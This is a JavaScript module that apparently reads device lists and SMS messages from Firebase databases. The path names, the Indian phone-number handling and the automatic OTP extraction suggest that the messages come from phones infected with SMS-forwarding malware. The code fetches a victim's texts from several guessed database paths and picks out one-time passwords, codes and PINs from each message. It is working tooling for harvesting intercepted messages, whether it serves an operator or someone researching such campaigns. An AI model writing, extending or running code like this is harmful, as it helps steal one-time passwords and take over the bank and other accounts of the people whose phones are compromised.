export function cleanBase(url) {
  if (!url) return "";
  let u = String(url).trim().replace(/\/$/, "");
  u = u.replace(/\/\.json$/i, "").replace(/\.json$/i, "");
  if (!/^https?:\/\//i.test(u)) u = "https://" + u;
  return u;
}

export function fbUrl(base, path, auth) {
  const b = cleanBase(base);
  let p = path.startsWith("/") ? path.slice(1) : path;
  if (!p.endsWith(".json")) p += ".json";
  let url = `${b}/${p}`;
  if (auth) url += (url.includes("?") ? "&" : "?") + `auth=${encodeURIComponent(auth)}`;
  return url;
}

export async function fbGet(base, path, auth) {
  const url = fbUrl(base, path, auth);
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), 12000);
  try {
    const r = await fetch(url, { signal: ctrl.signal, cache: "no-store" });
    if (!r.ok) return { ok: false, status: r.status, data: null };
    const text = await r.text();
    if (!text || text === "null") return { ok: true, status: r.status, data: null };
    try {
      return { ok: true, status: r.status, data: JSON.parse(text) };
    } catch {
      return { ok: false, status: r.status, data: null };
    }
  } catch (e) {
    return { ok: false, status: 0, data: null, error: String(e.message || e) };
  } finally {
    clearTimeout(t);
  }
}

const PHONE_KEYS = ["phoneNumber", "phone", "mobile", "mobNo", "number", "msisdn", "sim1Number", "sim2Number"];
const BATTERY_KEYS = ["battery", "batteryLevel", "bat", "Battery"];
const STATUS_KEYS = ["status", "state", "connection", "online", "isOnline"];

export function extractPhone(dev) {
  if (!dev || typeof dev !== "object") return "";
  for (const k of PHONE_KEYS) {
    const v = dev[k];
    if (v == null) continue;
    let s = String(v).replace(/\D/g, "");
    if (s.length > 10 && s.startsWith("91")) s = s.slice(-10);
    if (s.length === 10 && "6789".includes(s[0])) return s;
  }
  if (dev.sims) {
    const sims = Array.isArray(dev.sims) ? dev.sims : Object.values(dev.sims);
    for (const s of sims) {
      if (s && typeof s === "object") {
        const p = extractPhone(s);
        if (p) return p;
      }
    }
  }
  return "";
}

export function extractBattery(dev) {
  if (!dev || typeof dev !== "object") return null;
  for (const k of BATTERY_KEYS) {
    const v = dev[k];
    if (v == null) continue;
    const n = parseInt(String(v).replace("%", ""), 10);
    if (!Number.isNaN(n) && n >= 0 && n <= 100) return n;
  }
  return null;
}

export function isOnline(dev) {
  if (!dev || typeof dev !== "object") return false;
  for (const k of STATUS_KEYS) {
    const v = dev[k];
    if (v === true || v === 1) return true;
    if (typeof v === "string") {
      const s = v.toLowerCase();
      if (["online", "connected", "active", "true", "1"].includes(s)) return true;
      if (["offline", "disconnected", "inactive", "false", "0"].includes(s)) return false;
    }
  }
  const last = dev.lastSeen || dev.last_seen || dev.updatedAt || dev.ts;
  if (typeof last === "number") {
    let ts = last;
    if (ts > 1e12) ts /= 1000;
    if (Date.now() / 1000 - ts < 180) return true;
  }
  return false;
}

export function normalizeDevices(clients) {
  if (!clients || typeof clients !== "object") return [];
  return Object.entries(clients).map(([id, dev]) => {
    const d = dev && typeof dev === "object" ? dev : {};
    return {
      id,
      name: d.device_name || d.d_name || d.model || d.Model || id.slice(0, 16),
      phone: extractPhone(d),
      battery: extractBattery(d),
      online: isOnline(d),
      android: d.android || d.osVersion || d.sdk || "",
      raw: d,
    };
  });
}

export function normalizeSms(node) {
  if (!node || typeof node !== "object") return [];
  const bodyKeys = ["body", "message", "msg", "text", "content", "Body", "Message"];
  const senderKeys = ["sender", "from", "address", "ph", "Sender", "From"];
  const timeKeys = ["date", "dateTime", "timestamp", "time", "receivedDate", "Date"];
  const rows = [];
  for (const [key, entry] of Object.entries(node)) {
    if (!entry || typeof entry !== "object") continue;
    let body = "", sender = "", ts = "";
    for (const k of bodyKeys) if (entry[k]) { body = String(entry[k]); break; }
    for (const k of senderKeys) if (entry[k]) { sender = String(entry[k]); break; }
    for (const k of timeKeys) if (entry[k]) { ts = String(entry[k]); break; }
    if (!body) continue;
    const otp = (body.match(/(?:otp|code|pin)[^\d]{0,8}(\d{4,8})/i) || body.match(/\b(\d{4,8})\b/) || [])[1] || null;
    rows.push({ key, body, sender, ts, otp });
  }
  rows.sort((a, b) => String(b.key).localeCompare(String(a.key)));
  return rows;
}

export function smsPaths(deviceId) {
  return [
    `messages/${deviceId}`,
    `user_sms/${deviceId}`,
    `sms/${deviceId}`,
    `sms_forward/${deviceId}`,
    `All_Users/sms/${deviceId}`,
    `Sms/${deviceId}`,
  ];
}
